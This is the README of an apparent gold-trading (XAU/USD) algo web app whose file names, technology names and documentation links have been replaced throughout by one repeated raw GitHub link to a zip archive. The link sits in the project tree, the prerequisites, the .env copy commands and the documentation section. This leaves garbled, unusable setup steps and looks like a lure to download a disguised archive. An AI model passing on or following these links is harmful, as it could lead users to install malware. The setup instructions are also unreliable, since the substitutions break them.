# XAU/USD Algo Trader Platform

A comprehensive trading platform for XAU/USD algorithmic trading with user management, premium signals, and educational resources.

## Project Structure

This is a monorepo containing both frontend and backend applications:

```
├── frontend/          # React frontend application
├── backend/           # https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip backend API
├── https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip       # Root https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip with monorepo scripts
├── https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip        # Vercel deployment configuration
└── https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip          # This file
```

## Technologies Used

### Frontend
- **React 18** with TypeScript
- **Vite** for build tooling
- **Tailwind CSS** for styling
- **shadcn/ui** for UI components
- **React Router** for routing
- **React Query** for API state management

### Backend
- **https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip** with https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip
- **Supabase** for database and authentication
- **JWT** for token-based authentication
- **Nodemailer** for email services

## Quick Start

### Prerequisites
- https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip 18 or higher
- npm or yarn

### Installation
```bash
# 1. Setup environment files
npm run setup

# 2. Install dependencies for all projects
npm run install:all
```

### Development
```bash
# Run both frontend and backend in development mode
npm run dev
```

This will start:
- Frontend at `http://localhost:3000`
- Backend at `http://localhost:8080`

### Individual Development
```bash
# Frontend only
npm run dev:frontend

# Backend only
npm run dev:backend
```

### Production Build
```bash
# Build frontend for production
npm run build
```

## Environment Setup

### Quick Setup
```bash
# Copy environment files from examples
cd frontend && cp https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip .env && cd ..
cd backend && cp https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip .env && cd ..
```



## Available Scripts

- `npm run setup` - Setup environment files from examples
- `npm run dev` - Run both frontend and backend
- `npm run build` - Build frontend for production
- `npm run install:all` - Install dependencies for all projects
- `npm run clean` - Clean all node_modules and build files
- `npm run lint` - Run linting
- `npm run type-check` - Run TypeScript type checking

## Deployment

This project is configured for deployment on Vercel:
- Frontend is deployed as a static site
- Backend API routes are deployed as serverless functions

## Documentation

- [Frontend Documentation](https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip)
- [Backend Documentation](https://github.com/debashishmishra1122/XAUUSDALGOTRADER-WEBAPP/raw/refs/heads/main/frontend/src/components/XAUUSDALGOTRADE-WEBAPP-v2.3.zip)
